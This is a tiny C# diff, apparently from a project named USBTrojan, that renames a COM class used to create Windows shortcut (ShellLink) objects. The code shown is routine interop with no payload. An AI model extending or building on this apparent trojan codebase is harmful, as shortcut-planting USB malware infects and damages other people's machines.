@@ -92,11 +92,11 @@ namespace USBTrojan
         [ComImport,
         Guid("00021401-0000-0000-C000-000000000046"),
         ClassInterface(ClassInterfaceType.None)]
-        private class shl_link { }
+        private class Shl_link { }
 
         internal static IShellLinkW CreateShellLink()
         {
-            return (IShellLinkW)(new shl_link());
+            return (IShellLinkW)(new Shl_link());
         }
     }
 
